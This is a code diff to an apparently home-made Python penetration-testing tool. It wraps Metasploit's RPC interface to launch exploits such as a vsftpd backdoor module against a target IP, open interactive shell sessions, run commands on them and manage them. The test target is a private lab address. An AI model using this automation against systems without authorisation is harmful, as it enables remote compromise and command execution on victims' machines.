@@ -88,18 +88,186 @@ class Scanner:
             return result.stderr
 
 class Exploiter:
-    def __init__(self):
-        load_dotenv()
-        self.client = MsfRpcClient(os.getenv("MSF_RPC_PASSWORD"), port=int(os.getenv("MSF_RPC_PORT")))
+    def __init__(self, msf_client=None):
+        if msf_client is None:
+            raise ValueError("MsfRpcClient instance must be provided to Exploiter")
+        self.client = msf_client
+    
     def find_vulnerabilities_for_service(self, service_name):
         available_exploits = []
         for exploit in self.client.modules.exploits:
             if service_name.lower() in exploit:
                 available_exploits.append(exploit)
         return available_exploits
+    
+    def run_exploit(self, exploit_name, target_ip, options):
+        """
+        Run a Metasploit exploit against a target
+        
+        Args:
+            exploit_name: Full path to the exploit (e.g., 'unix/ftp/vsftpd_234_backdoor')
+            target_ip: Target IP address
+            options: Dictionary of additional options for the exploit
+        
+        Returns:
+            Dictionary with execution results and session info
+        """
+        try:
+            # Load the exploit module
+            exploit = self.client.modules.use('exploit', exploit_name)
+            
+            # Set target
+            exploit['RHOSTS'] = target_ip
+            
+            # Set additional options (skip payload and LHOST/LPORT as they're handled separately)
+            for option, value in options.items():
+                if option not in ['payload', 'LHOST', 'LPORT']:
+                    exploit[option] = value
+            
+            # Check if exploit requires a payload
+            if 'payload' in options:
+                payload_name = options['payload']
+            else:
+                # Default payload
+                payload_name = 'cmd/unix/interact'
+            
+            payload = self.client.modules.use('payload', payload_name)
+            
+            # Set payload options if provided
+            if 'LHOST' in options:
+                payload['LHOST'] = options['LHOST']
+            if 'LPORT' in options:
+                payload['LPORT'] = options['LPORT']
+            
+            # Execute the exploit
+            result = exploit.execute(payload=payload)
+            
+            # Check if a session was created
+            sessions = self.get_sessions()
+            session_id = None
+            if sessions:
+                # Get the most recent session (highest ID)
+                session_id = max(sessions.keys())
+            
+            return {
+                'success': True,
+                'exploit': exploit_name,
+                'target': target_ip,
+                'result': result,
+                'session_id': session_id,
+                'message': f'Exploit executed successfully. Session ID: {session_id}' if session_id else 'Exploit executed, but no session created.'
+            }
+        
+        except Exception as e:
+            return {
+                'success': False,
+                'exploit': exploit_name,
+                'target': target_ip,
+                'error': str(e),
+                'message': f'Exploit execution failed: {str(e)}'
+            }
+    
+    def get_sessions(self):
+        """
+        Get all active sessions
+        
+        Returns:
+            Dictionary of active sessions with their details
+        """
+        try:
+            sessions = self.client.sessions.list
+            return sessions
+        except Exception as e:
+            return {}
+    
+    def execute_command(self, session_id, command):
+        """
+        Execute a command on a specific session
+        
+        Args:
+            session_id: The session ID to execute the command on
+            command: The command to execute
+        
+        Returns:
+            Dictionary with command output
+        """
+        try:
+            session = self.client.sessions.session(str(session_id))
+            
+            # Write the command
+            session.write(command)
+            
+            # Read the output (wait a bit for command to execute)
+            import time
+            time.sleep(1)
+            output = session.read()
+            
+            return {
+                'success': True,
+                'session_id': session_id,
+                'command': command,
+                'output': output,
+                'message': 'Command executed successfully'
+            }
+        except Exception as e:
+            return {
+                'success': False,
+                'session_id': session_id,
+                'command': command,
+                'error': str(e),
+                'message': f'Command execution failed: {str(e)}'
+            }
+    
+    def stop_session(self, session_id):
+        """
+        Stop/kill a specific session
+        
+        Args:
+            session_id: The session ID to stop
+        
+        Returns:
+            Dictionary with result
+        """
+        try:
+            self.client.sessions.stop(str(session_id))
+            return {
+                'success': True,
+                'session_id': session_id,
+                'message': f'Session {session_id} stopped successfully'
+            }
+        except Exception as e:
+            return {
+                'success': False,
+                'session_id': session_id,
+                'error': str(e),
+                'message': f'Failed to stop session: {str(e)}'
+            }
 
 if __name__ == "__main__":
+    load_dotenv()
+    
+    # Kill any existing msfrpcd processes
+    os.system("pkill -9 -f msfrpcd")
+    import time
+    time.sleep(1)
+    
+    # Start msfrpcd
+    password = os.getenv("MSF_RPC_PASSWORD")
+    port = os.getenv("MSF_RPC_PORT", "55552")
+    cmd = f"msfrpcd -P {password} -p {port} -a 127.0.0.1"
+    ret = os.system(cmd)
+    if ret == 0:
+        print("msfrpcd started successfully")
+    else:
+        print(f"msfrpcd exited with code {ret}")
+    
+    time.sleep(3)
+    
+    # Initialize MsfRpcClient and Exploiter
+    msf_client = MsfRpcClient(password, port=int(port), ssl=True)
+    exploiter = Exploiter(msf_client)
+    
+    # Test
     scanner = Scanner()
     print(scanner.scan_specific_port("192.168.64.2", "3306"))
-    # exploiter = Exploiter()
-    # exploiter.find_vulnerabilities_for_service("ftp")
+    print(exploiter.find_vulnerabilities_for_service("vsftpd"))
